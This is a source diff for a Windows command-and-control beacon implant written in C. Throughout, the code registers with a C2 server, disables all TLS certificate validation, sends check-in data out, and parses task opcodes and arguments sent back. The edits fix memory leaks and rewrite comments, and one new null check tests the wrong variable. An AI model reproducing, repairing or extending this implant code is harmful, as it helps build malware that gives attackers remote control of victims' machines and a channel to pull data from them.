@@ -33,7 +33,7 @@
 BOOL GetBasicUserInfo(struct BasicUserInfo *UserInfo)
 {
 
-    /* get basic information about how the current user is running */
+    /* get basic infomation about how the current user is running */
 
     DWORD dwUserBuf = 256;
     char chCurrentUser[256];
@@ -171,7 +171,7 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
 
     if (!hSession)
     {
-        // not really a lot we can do about this, guess we just return and try again later
+        // not really alot we can do about this, guess we just return and try again later...
         return FALSE;
     }
 
@@ -196,7 +196,7 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
         return FALSE;
     }
 
-    // set the flags for our request, basically so we can connect when the c2 ssl cert is messed up
+    // set the flags for our request, basically so we can connect when the c2 ssl cert is fucked
     flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
     if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags)))
@@ -231,7 +231,7 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
         {
             if (!WinHttpQueryDataAvailable( hRequest, &dwSize))
             {
-                // Theres no data available
+                // Theres no data avalible
                 DEBUG("WinHttpQueryDataAvailable error\n");
                 return FALSE;
             }
@@ -252,15 +252,18 @@ BOOL BeaconRegisterC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent
     WinHttpCloseHandle(hSession);
     WinHttpCloseHandle(hConnect);
 
-    // now its time to parse the json data in the response
+    // now its time to parse the json data in the responce
     parsed_json = json_tokener_parse(ReadBuffer);
 
     // get the id and store it in the idbuffer
     parsed_json = json_object_object_get(parsed_json, "id");
     strcpy(IdBuffer, json_object_get_string(parsed_json));
 
-    // now check we don't need to kill ourselves
+    // now check we dont need to kill ourselves
     CheckIfDie(&ReadBuffer);
+
+    // Decrement json object reference count
+    json_object_put(parsed_json);
 
     return TRUE;
 }
@@ -270,7 +273,7 @@ LPCSTR* BuildCheckinData(DWORD OpCode, LPCSTR Data, DWORD Mode)
     /*
     Build the reply to the C2 containing any data we need to send back
     */
-
+    LPCSTR *beaconCheckinData;
     struct json_object *jobj;
 
     // init the json object
@@ -284,7 +287,7 @@ LPCSTR* BuildCheckinData(DWORD OpCode, LPCSTR Data, DWORD Mode)
     {
     case MODE_CHECKIN_NO_DATA:
 
-        // don't add any data
+        // dont add any data
         break;
 
     case MODE_CHECKIN_DATA:
@@ -299,8 +302,10 @@ LPCSTR* BuildCheckinData(DWORD OpCode, LPCSTR Data, DWORD Mode)
         break;
     }
 
-    // return the formatted data
-    return (LPCSTR*)json_object_to_json_string_ext(jobj, JSON_C_TO_STRING_PLAIN);
+    // return the formated data
+    beaconCheckinData = (LPCSTR *) _strdup(json_object_to_json_string_ext(jobj, JSON_C_TO_STRING_PLAIN));
+    json_object_put(jobj);
+    return beaconCheckinData;
 }
 
 LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserAgent, DWORD *OpCode, LPCSTR SendBuffer, DWORD SendOpCode, DWORD SendBufferSize)
@@ -317,22 +322,15 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
     DWORD               flags;
 
     struct json_object *parsed_json;
-
-    // check if we doing a normal checkin or sending data
-
-    if (SendBuffer == NULL && SendOpCode == NULL)
-    {
-        UriBuffer = (LPCSTR*)malloc(5000);
-    } else {
-        UriBuffer = (LPCSTR*)malloc(SendBufferSize * 2);
-    }
+    struct json_object *parsed_json_task;
+    struct json_object *parsed_json_args;
 
     // initiate the session
     hSession = WinHttpOpen((LPCWSTR)UserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
 
     if (!hSession)
     {
-        // not really a lot we can do about this, guess we just return and try again later
+        // not really alot we can do about this, guess we just return and try again later...
         return FALSE;
     }
 
@@ -357,7 +355,7 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
         return FALSE;
     }
 
-    // set the flags for our request, basically so we can connect when the c2 ssl cert is messed up
+    // set the flags for our request, basically so we can connect when the c2 ssl cert is fucked
 
     flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
@@ -372,8 +370,6 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
 
     // build the data for the request
 
-    memset(UriBuffer, '\0', strlen(UriBuffer));
-
     if (SendOpCode != NULL)
     {
         UriBuffer = BuildCheckinData(SendOpCode, SendBuffer, MODE_CHECKIN_DATA);
@@ -383,6 +379,7 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
 
     // finally send the actual request to the c2
     bResults = WinHttpSendRequest(hRequest, _POST_HEADER, _HEADER_LEN, (LPVOID)UriBuffer, strlen((char*)UriBuffer), strlen((char*)UriBuffer), 0);
+    free(UriBuffer);
 
     // make sure the request was successful
 
@@ -455,17 +452,23 @@ LPCWSTR* BeaconCallbackC2(LPCSTR CallbackAddress, INT CallbackPort, LPCSTR UserA
 
     // get the opcode
     parsed_json = json_tokener_parse(ResBuffer);
-    parsed_json = json_object_object_get(parsed_json, "task");
-    *OpCode     = json_object_get_int(parsed_json);
+    parsed_json_task = json_object_object_get(parsed_json, "task");
+    *OpCode     = json_object_get_int(parsed_json_task);
 
-    parsed_json = json_tokener_parse(ResBuffer);
-    parsed_json = json_object_object_get(parsed_json, "args");
+    parsed_json_args = json_object_object_get(parsed_json, "args");
+    LPCSTR *argsBuffer = NULL;
     if (parsed_json != NULL)
     {
-        return json_object_get_string(parsed_json);
+        // Copy args json string into return buffer
+        argsBuffer = (LPCSTR *) _strdup(json_object_get_string(parsed_json_args));
     }
-
-    return NULL;
+    // Free ResBuffer json object
+    json_object_put(parsed_json);
+    // Cleanup handles
+    WinHttpCloseHandle(hRequest);
+    WinHttpCloseHandle(hSession);
+    WinHttpCloseHandle(hConnect);
+    return argsBuffer;
 }
 
 BOOL SpawnExecuteCode(char* Base64Buffer)
